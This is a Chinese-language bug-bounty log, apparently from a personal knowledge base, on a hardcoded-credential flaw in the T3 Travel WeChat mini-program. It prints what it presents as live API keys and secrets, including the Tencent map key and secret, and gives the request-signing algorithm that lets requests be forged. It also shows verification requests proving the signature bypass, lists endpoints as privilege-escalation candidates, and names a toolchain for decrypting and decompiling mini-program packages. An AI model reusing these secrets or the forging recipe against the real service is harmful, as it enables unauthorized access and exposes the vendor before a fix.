# T3 首单全记录（2026-08-18）

> 里程碑：sora 第一个真实 SRC 漏洞提交（T3SRC，漏洞盒子）
> 技能：src-bug-hunting「T3 首单实战案例」章节
> 状态：已提交，待审核（1-3 工作日）

## 一、漏洞信息

```
目标: T3出行微信小程序 (wxe241a1d8464bc578)
漏洞: orion-app-api 签名密钥硬编码
  位置: config/env.js
  密钥: appKey=36c6638339c14fb38cd9120586e6c6eb
        appSecretKey=2088f0b7671b4ee190d37c1ce8d827a2
  (pre 环境还有一套同样暴露)
定级: 高危（CWE-798 硬编码凭据，高危标准(1)白纸黑字）
预期: 普通业务 1000 / 保底中危 500
```

## 二、签名算法（前端完全可复现）

```javascript
// api/orion-app-api/index.js
getAllDic:
  sign = md5(appKey + "&" + deviceId + "&" + timestamp + "&true&" + JSON.stringify(launchImg))
queryChannel:
  params = sorted(values).join("&")
  sign = md5(appSecretKey + "&" + deviceId + "&" + timestamp + "&" + params)
header = { appKey, deviceId, timestamp, sign }
```

## 三、验证过程（3 次只读请求）

```
请求 1: 直接 POST → HTTP 200 + code 500「isQueryAll 不能为空」
  → 签名已通过！只缺参数
请求 2: 加 isQueryAll → HTTP 200 + code 500「客户端宽度/高度不能为空」
  → 参数结构不对
请求 3: body={isQueryAll:true, launchImg:{imgSizeWidth:390,imgSizeHeight:844}}
  → HTTP 200 + code 200 + 完整业务配置（30+ 项）
  → 签名绕过坐实
```

## 四、同包其他发现（后续可挖）

```
① 腾讯位置服务 Key/SecretKey:
   qqMapKey=QMBBZ-IFDHR-TQMW7-WTNNY-XOFDF-PXF5F
   qqMapSecretKey=p8O5bHSHt5OEiMyvrsEfhOkHNB0r36ia (config/index.js)
② 6 个测试/预发环境 URL 全暴露
③ 60+ 接口路径清单（越权测试候选）
   - queryShareRouteTrajectory (分享轨迹, 潜在 IDOR)
   - user/manager/passengerInfo (潜在越权)
   - injectToken/authentication/idCardAuth (可疑路径)
④ 鼎象设备指纹 SDK（隐私合规线候选）
```

## 五、经验教训（沉淀核心）

```
1. 反编译后先看 config/env.js——密钥重灾区
2. 签名算法必在前端（api/<service>/index.js）→ 可复现=可伪造
3. 参数结构必须精确复现（launchImg 子对象坑）
4. 验证响应: HTTP 200 + code 500 = 签名已过, 补参数继续
5. 证据图: PIL+微软雅黑渲染（终端中文会乱码）
6. 附件: .py 不支持 → 打包 zip
7. 等级: 硬编码=高危, 提交时冲最高合理等级
8. 简述字段不填 URL/Payload, 具体放复现步骤
9. 保密: 提交后含被忽略的都不能对外说
10. 沟通: 厂商联系只走平台渠道（评论/站内信）
```

## 六、工具链（全部验证可用）

```
微信提取: AppData\Roaming\Tencent\xwechat\radium\users\<id>\applet\packages\
V1MMWX 解密: decrypt_wxapkg.py (PBKDF2(appid)+AES-CBC+XOR)
反编译: unveilr.exe
密钥扫描: ai_secret_scan.py (正则+LLM, 注意 DeepSeek 限流会卡)
签名 POC: poc_t3_orion.py
验证脚本: verify_orion.py
证据图: PIL + 微软雅黑
```

---
> 🗺️ 属于 [[MOC-Security]] · [[Home|🏠 Home]]
